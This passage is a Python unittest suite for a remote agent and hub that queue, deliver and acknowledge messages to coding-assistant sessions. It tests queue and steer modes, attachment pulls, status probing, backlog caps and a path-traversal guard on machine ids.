        ag = self._agent()
        ag._capture("k", protocol.event(
            "message.appended", "k", ag.machine_id,
            protocol.message("user", "keep me")))
        b = self._agent()
        self.assertEqual(len(b.outbox), 1)
        self.assertEqual(b.outbox[0]["data"]["text"], "keep me")
        # Acked events don't requeue.
        ag2 = self._agent()
        ag2._outbox_ack = 1
        ag2._save_outbox_ack()
        c = self._agent()
        self.assertEqual(c.outbox, [])

    def test_push_events_ack_advances(self):
        ag = self._agent()
        ag._capture("k", protocol.event("notify", "k", ag.machine_id,
                                      {"kind": "finished"}))
        with patch.object(agent_mod, "_post", return_value=(200, {})):
            self.assertTrue(ag._push_events())
        self.assertEqual(ag._outbox_ack, 1)
        self.assertEqual(ag.outbox, [])

    def test_tail_op_starts_tailer(self):
        ag = self._agent()
        sess = _session()
        ag.catalog.session_for = lambda k: sess
        with patch.object(ag.tail_manager, "ensure") as en:
            ok, note, _deg = ag._execute("claude:s1", "tail",
                                   {"status": "idle"})
        self.assertTrue(ok)
        en.assert_called_once_with("claude:s1", sess, "idle")

    def test_message_op_uses_live_status(self):
        ag = self._agent()
        sess = _session()
        ag.catalog.session_for = lambda k: sess
        ag.status_of = MagicMock(side_effect=OSError)  # probe fails
        ag.tail_manager.statuses["k"] = "done"   # queue said "active"
        fake = MagicMock()
        fake.send.return_value = inject.InjectResult(True, "ok")
        with patch.object(supervise, "meta_for", return_value={}), \
             patch.object(inject, "injector_for", return_value=fake):
            ag._execute("k", "message",
                        {"text": "hi", "status": "active"})
        self.assertEqual(fake.send.call_args[0][2], "done")


class TestSatelliteQueueMode(unittest.TestCase):
    """``queue``-mode sends wait for idle on the satellite, like the hub."""

    def setUp(self):
        self.home = temp_dir(self)
        poll = patch.object(agent_mod, "QUEUE_POLL_S", 0.01)
        poll.start()
        self.addCleanup(poll.stop)
        self.ag = agent_mod.RemoteAgent("http://h:1", "cred", self.home)
        self.addCleanup(self.ag._stop.set)
        self.sess = _session()
        self.ag.catalog.session_for = lambda k: self.sess
        self.status = "active"
        self.ag.status_of = lambda sessions: [self.status]
        self.fake = MagicMock()
        self.fake.send.return_value = inject.InjectResult(True, "sent")
        self.patches = [
            patch.object(supervise, "meta_for", return_value={}),
            patch.object(inject, "injector_for", return_value=self.fake),
        ]
        for p in self.patches:
            p.start()
            self.addCleanup(p.stop)

    def _frame(self, seq, mode="queue", key="claude:s1"):
        self.ag._handle_frame(json.dumps({
            "type": "command", "seq": seq, "session": key,
            "data": {"op": "message", "command_id": f"c{seq}",
                     "client_id": f"cid-{seq}", "text": "hi",
                     "mode": mode, "status": "active"},
        }).encode())

    def _wait(self, cond, timeout=5.0):
        end = time.monotonic() + timeout
        while not cond():
            if time.monotonic() > end:
                self.fail("timed out")
            time.sleep(0.01)

    def _results(self):
        with self.ag._outbox_lock:
            return [e["data"] for e in self.ag.outbox
                    if e.get("type") == "command.result"]

    def test_queue_send_waits_for_idle_then_delivers(self):
        self._frame(1)
        time.sleep(0.1)
        self.fake.send.assert_not_called()  # mid-turn: still waiting
        self.assertEqual(self.ag._done_cmd_seq, 0)
        self.status = "done"
        self._wait(lambda: self.fake.send.called)
        self.assertEqual(self.fake.send.call_args[0][1]["mode"], "queue")
        self.assertEqual(self.fake.send.call_args[0][2], "done")
        self._wait(lambda: self.ag._done_cmd_seq == 1)
        [res] = self._results()
        self.assertTrue(res["ok"])
        self.assertEqual(res["client_id"], "cid-1")

    def test_steer_skips_the_wait(self):
        self._frame(1)                 # parked behind the turn
        self._frame(2, mode="steer")   # its own key, goes at once
        self._wait(lambda: self.fake.send.called)
        self.assertEqual(self.fake.send.call_count, 1)
        self.assertEqual(self.fake.send.call_args[0][1]["mode"], "steer")
        self._wait(lambda: 2 in self.ag._done_set)
        self.assertEqual(self.ag._done_cmd_seq, 0)  # 1 still waits

    def test_other_session_is_not_held(self):
        self.ag.status_of = lambda sessions: [
            "active" if sessions[0] is self.sess else "done"]
        other = _session("s2")
        self.ag.catalog.session_for = (
            lambda k: other if k == "claude:s2" else self.sess)
        self._frame(1)
        self._frame(2, key="claude:s2")
        self._wait(lambda: self.fake.send.called)
        self.assertIs(self.fake.send.call_args[0][0], other)

    def test_busy_past_cap_fails_honestly(self):
        with patch.object(agent_mod, "QUEUE_WAIT_MAX_S", 0.05):
            self._frame(1)
            self._wait(lambda: self.ag._done_cmd_seq == 1)
        self.fake.send.assert_not_called()
        [res] = self._results()
        self.assertFalse(res["ok"])
        self.assertIn("stayed busy", res["note"])
        self.assertEqual(res["client_id"], "cid-1")
        self.assertEqual(res["command_id"], "c1")

    def test_stop_leaves_waiting_send_for_replay(self):
        self._frame(1)
        time.sleep(0.05)
        self.ag._stop.set()
        self.ag._sendq.close()
        time.sleep(0.1)
        self.status = "done"
        time.sleep(0.05)
        self.fake.send.assert_not_called()
        self.assertEqual(self.ag._done_cmd_seq, 0)  # replays on restart
        self.assertEqual(self._results(), [])

    def test_steer_and_its_pull_pass_a_waiting_send(self):
        # A queue-mode send waits out the turn on its own lane; the
        # steer behind it, and the attachment pull it needs, go now.
        fetch = patch.object(agent_mod, "_get_bytes", return_value=b"png")
        fetch.start()
        self.addCleanup(fetch.stop)
        self._frame(1)
        self.ag._handle_frame(json.dumps({
            "type": "command", "seq": 2, "session": "claude:s1",
            "data": {"op": "attachment", "command_id": "c2",
                     "ref": "1-ab-shot.png"}}).encode())
        self.ag._handle_frame(json.dumps({
            "type": "command", "seq": 3, "session": "claude:s1",
            "data": {"op": "message", "command_id": "c3", "text": "see",
                     "mode": "steer", "attachments": ["1-ab-shot.png"]},
        }).encode())
        self._wait(lambda: self.fake.send.called)
        cmd = self.fake.send.call_args[0][1]
        self.assertEqual(cmd["mode"], "steer")
        self.assertTrue(cmd["attachments"][0].endswith("1-ab-shot.png"))
        self.assertEqual(self.fake.send.call_count, 1)  # 1 still waits

    def test_idle_is_checked_after_the_pulls(self):
        # A steer can start a turn while the queued send's file is
        # still downloading: the send must wait that turn out too.
        order = []
        self.ag._await_pulls = lambda k, d: order.append("pulls") or True
        real_wait = self.ag._wait_idle
        self.ag._wait_idle = lambda k, d: order.append("idle") or real_wait(k, d)
        self.status = "done"
        self._frame(1)
        self._wait(lambda: self.fake.send.called)
        self.assertEqual(order, ["pulls", "idle"])

    def test_queued_send_waits_for_its_pull(self):
        pull = threading.Event()
        self.ag._pulls[("claude:s1", "r1")] = pull
        got = []
        t = threading.Thread(target=lambda: got.append(
            self.ag._await_pulls("claude:s1", {"attachments": ["r1"]})))
        t.start()
        time.sleep(0.05)
        self.assertEqual(got, [])   # still downloading
        pull.set()
        t.join(5)
        self.assertEqual(got, [True])
        # A ref with no pull in flight doesn't wait; a stop says so.
        self.assertTrue(self.ag._await_pulls("claude:s1",
                                             {"attachments": ["gone"]}))
        self.ag._pulls[("claude:s1", "r2")] = threading.Event()
        self.ag._stop.set()
        self.assertFalse(self.ag._await_pulls("claude:s1",
                                              {"attachments": ["r2"]}))

    def test_missing_session_stops_waiting(self):
        self.ag.catalog.session_for = lambda k: None
        self._frame(1)
        self._wait(lambda: self.ag._done_cmd_seq == 1)
        [res] = self._results()
        self.assertFalse(res["ok"])
        self.assertIn("unknown session", res["note"])

    def test_probe_sees_the_tailers_activity_time(self):
        # The catalog copy is stale (timestamp 0); the tailer saw the
        # transcript move just now, and the probe gets that time.
        seen = []
        self.ag.status_of = lambda sessions: seen.append(
            sessions[0].timestamp) or ["active"]
        self.ag.tail_manager.last_append["claude:s1"] = 1000.0
        self.ag.tail_manager.tailers["claude:s1"] = MagicMock(
            session=self.sess, source=MagicMock(path=None))
        self.ag._live_status("claude:s1", {})
        self.assertEqual(seen, [1000.0 * 1000])

    def test_live_status_prefers_fresh_probe(self):
        self.ag.tail_manager.statuses["claude:s1"] = "active"
        self.status = "done"
        self.assertEqual(self.ag._live_status("claude:s1", {}), "done")
        self.ag.status_of = MagicMock(side_effect=OSError)
        self.assertEqual(
            self.ag._live_status("claude:s1", {}), "active")
        self.ag.catalog.session_for = lambda k: None
        self.assertEqual(
            self.ag._live_status("gone", {"status": "idle"}), "idle")


class TestReviewHubFixes(unittest.TestCase):
    """Hub side: path safety, offline sweep, backlog cap."""

    def setUp(self):
        self.srv = _AgentHub()
        self.addCleanup(self.srv.stop)

    def test_machine_id_traversal_stays_in_satellite_dir(self):
        rows = [{"key": "claude:x", "title": "t"}]
        catalog_mod.merge_remote_rows(self.srv.home, "../devices", rows)
        base = catalog_mod._satellite_dir(self.srv.home)
        self.assertTrue(list(base.glob("*.json")))
        # devices.json untouched — the traversal wrote nowhere near it.
        self.assertNotEqual(
            pairing.load_devices(self.srv.home), {})

    def test_restart_marks_satellites_offline(self):
        catalog_mod.upsert_machine(
            self.srv.home, {"id": "sat-x", "online": True})
        self.srv.state._register_machine()
        row = catalog_mod.load_machines(self.srv.home)["sat-x"]
        self.assertFalse(row["online"])

    def test_backlog_cap_returns_429(self):
        st = self.srv.state
        st._sat_acked["sat-m1"] = 0
        with patch.object(st.journal, "last_seq", return_value=3000):
            self.assertIsNone(
                st.queue_command("sat-m1", "message", "k", {}))

    def test_acked_cursor_relaxes_cap(self):
        st = self.srv.state
        st._sat_acked["sat-m1"] = 2500
        with patch.object(st.journal, "last_seq", return_value=3000):
            self.assertIsNotNone(
                st.queue_command("sat-m1", "message", "k", {}))

    def test_command_result_advances_ack_floor(self):
        # The in-band ack: a command.result emitted the way the
        # satellite's uplink delivers it moves the floor mid-stream,
        # not only on reconnect.
        st = self.srv.state
        cmd = st.queue_command("sat-m1", "control", "", {"ctl": "ping"})
        seq = cmd["seq"]
        with patch.object(st.journal, "last_seq",
                          return_value=hub.MAX_SAT_PENDING):
            self.assertIsNone(
                st.queue_command("sat-m1", "control", "", {"ctl": "x"}))
        st.emit("claude:r1@sat-m1", protocol.event(
            "command.result", "claude:r1@sat-m1", "sat-m1",
            {"command_id": cmd["data"]["command_id"],
             "op": "control", "ok": True}))
        self.assertEqual(st._sat_acked["sat-m1"], seq)
        with patch.object(st.journal, "last_seq",
                          return_value=hub.MAX_SAT_PENDING):
            self.assertIsNotNone(
                st.queue_command("sat-m1", "control", "", {"ctl": "x"}))

    def test_ack_floor_moves_only_over_contiguous_results(self):
        # A control that finishes while an earlier message op still
        # sits in the agent's work queue must not raise the floor —
        # replay after a restart still owes seq 1, so the pending
        # count has to keep covering it.
        st = self.srv.state
        c1 = st.queue_command("sat-m1", "message", "", {"text": "x"})
        c2 = st.queue_command("sat-m1", "control", "", {"ctl": "b"})
        st.emit("k", protocol.event(
            "command.result", "k", "sat-m1",
            {"command_id": c2["data"]["command_id"],
             "op": "control", "ok": True}))
        self.assertEqual(st._sat_acked.get("sat-m1", 0), 0)
        self.assertEqual(st._sat_done["sat-m1"], {2})
        st.emit("k", protocol.event(
            "command.result", "k", "sat-m1",
            {"command_id": c1["data"]["command_id"],
             "op": "message", "ok": True}))
        self.assertEqual(st._sat_acked["sat-m1"], 2)
        self.assertEqual(st._sat_done["sat-m1"], set())

    def test_unknown_result_id_keeps_floor(self):
        # Results for commands queued before a hub restart (or the
        # agent's own command_id-less detach reports) move nothing.
        st = self.srv.state
        st.emit("claude:r1@sat-m1", protocol.event(
            "command.result", "claude:r1@sat-m1", "sat-m1",
            {"command_id": "c999", "op": "control", "ok": True}))
        st.emit("claude:r1@sat-m1", protocol.event(
            "command.result", "claude:r1@sat-m1", "sat-m1",
            {"command_id": "", "op": "detach", "ok": True}))
        self.assertNotIn("sat-m1", st._sat_acked)

    def test_cmd_seq_map_prunes_at_floor(self):
        st = self.srv.state
        first = st.queue_command("sat-m1", "control", "", {"ctl": "a"})
        st.queue_command("sat-m1", "control", "", {"ctl": "b"})
        st.emit("k", protocol.event(
            "command.result", "k", "sat-m1",
            {"command_id": first["data"]["command_id"],
             "op": "control", "ok": True}))
        seqs = st._sat_cmd_seqs["sat-m1"]
        self.assertNotIn(first["data"]["command_id"], seqs)
        self.assertEqual(len(seqs), 1)  # the unacked command stays


if __name__ == "__main__":
    unittest.main()
